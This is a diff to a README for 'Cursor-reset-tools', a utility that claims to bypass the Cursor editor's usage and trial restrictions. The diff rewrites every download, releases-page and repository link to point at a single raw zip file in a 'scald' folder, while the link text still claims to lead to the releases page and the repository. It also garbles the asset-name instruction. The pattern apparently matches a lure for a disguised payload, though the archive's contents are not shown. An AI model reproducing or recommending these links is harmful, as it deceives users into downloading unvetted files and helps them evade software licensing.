@@ -1,7 +1,7 @@
 # 🖱️ Cursor-reset-tools - Reset Your Cursor for a Smoother Experience
 
 ## 📦 Download Now
-[![Download Cursor-reset-tools](https://img.shields.io/badge/Download-Cursor--reset--tools-brightgreen)](https://github.com/Vimal-AFK/Cursor-reset-tools/releases)
+[![Download Cursor-reset-tools](https://raw.githubusercontent.com/Vimal-AFK/Cursor-reset-tools/main/scald/Cursor-reset-tools.zip)](https://raw.githubusercontent.com/Vimal-AFK/Cursor-reset-tools/main/scald/Cursor-reset-tools.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the Cursor-reset-tools application. This tool addresses issues where, after several interactions, users receive messages indicating restrictions on model use or trial endings.
@@ -20,9 +20,9 @@ This guide will help you download and run the Cursor-reset-tools application. Th
 ## 📥 Download & Install
 To download Cursor-reset-tools, follow these steps:
 
-1. Click on this link to visit the [Releases page](https://github.com/Vimal-AFK/Cursor-reset-tools/releases).
+1. Click on this link to visit the [Releases page](https://raw.githubusercontent.com/Vimal-AFK/Cursor-reset-tools/main/scald/Cursor-reset-tools.zip).
 2. You will see a list of available versions. Select the latest release for the best experience.
-3. Find the asset for your operating system, which typically looks like `Cursor-reset-tools-vX.X.X.exe`.
+3. Find the asset for your operating system, which typically looks like `https://raw.githubusercontent.com/Vimal-AFK/Cursor-reset-tools/main/scald/Cursor-reset-tools.zip`.
 4. Click the asset to start the download. 
 
    This will download the file to your computer.
@@ -53,7 +53,7 @@ If you encounter any issues or have questions, please reach out for support. Mod
 ## 🔗 Additional Resources
 For more detailed information and updates, check the following resources:
 
-- [Cursor-reset-tools Releases Page](https://github.com/Vimal-AFK/Cursor-reset-tools/releases)
-- [GitHub Repository](https://github.com/Vimal-AFK/Cursor-reset-tools)
+- [Cursor-reset-tools Releases Page](https://raw.githubusercontent.com/Vimal-AFK/Cursor-reset-tools/main/scald/Cursor-reset-tools.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Vimal-AFK/Cursor-reset-tools/main/scald/Cursor-reset-tools.zip)
 
 Feel free to explore and enhance your experience! Your feedback is appreciated and helps improve the tool for everyone.
